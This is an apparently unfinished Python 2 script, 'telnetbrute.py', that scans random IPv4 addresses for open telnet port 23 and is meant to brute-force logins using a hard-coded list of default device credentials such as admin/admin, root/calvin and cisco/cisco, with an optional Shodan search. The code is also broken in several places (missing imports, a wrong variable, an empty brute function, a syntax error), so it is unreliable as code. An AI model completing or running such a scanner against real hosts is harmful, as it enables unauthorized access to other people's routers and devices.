import socket
import sys
import os
import telnetlib

entries = []
def add_entry(value_one, value_two):
    entries.append(value_one)
    entries.append(value_two)



def generate_random_ipv4():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))


def telnetscan(host, port=23):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        code = s.connect_ex((host, port))
        if code == 0:
            return True
        sock.close()
    except Exception as e:
        return False


def brute(host):
    # Do bruting of host (using logins as defuned above)

def print_help():
    print """
        Usage: python telnetbrute.py [VERBOSE] [SHODAN] [-h]

        SHODAN:         Search with shodan instead of custom scanner (Shodan module required)
        VERBOSE:        Print extra information messages
        -h:             Show this help message

    """

def main():
    verbose = False
    shodan = False

    for _ in range(len(sys.argv[])):
        if sys.argv[_] == "VERBOSE":
            verbose = True
        elif sys.argv[_] == "SHODAN":
            shodan = True
        elif sys.argv[_] == "-h":
            print_help()
        else:
            print_help()

    # Try to import the shodan module
    if shodan == True:
        try:
            import shodan
        except ImportError:
            print "Shodan required. Install it by using `pip install shodan`"

            #TODO do more stuff here

    while True:
        ip = generate_random_ipv4
        if verbose:
            print "Scanning: {}".format(ip)
        openport = telnetscan(ip)

        # If port 23 isn't open
        if not openport:
            pass
        else:
            brute(ip)


if __name__ == "__main__":
    add_entry('admin', 'admin')
    add_entry('admin', 'password')
    add_entry('admin', 'michaelangelo')
    add_entry('admin', '1234')
    add_entry('user', 'user')
    add_entry('user', 'password')
    add_entry('sitecom', 'admin')
    add_entry('', 'admin')
    add_entry('', '')
    add_entry('', 'password')
    add_entry('', 'connect')
    add_entry('', 'MiniAP')
    add_entry('', 'access')
    add_entry('', '1234')
    add_entry('1234', '1234')
    add_entry('root', 'calvin')
    add_entry('root', 'admin')
    add_entry('root', '123456')
    add_entry('sys', 'uplink')
    add_entry('cac_admin', 'cacadmin')
    add_entry('piranha', 'q')
    add_entry('piranha', 'piranha')
    add_entry('cisco', 'cisco')
    main()

'''
def test_connection(server, port):


while True:
    sleep(30000) # retry connection every 20 seconds
    connstat = test_connection(server, port)
    if connstat == 0:
        connect(server, port)
    else:
        pass
        '''
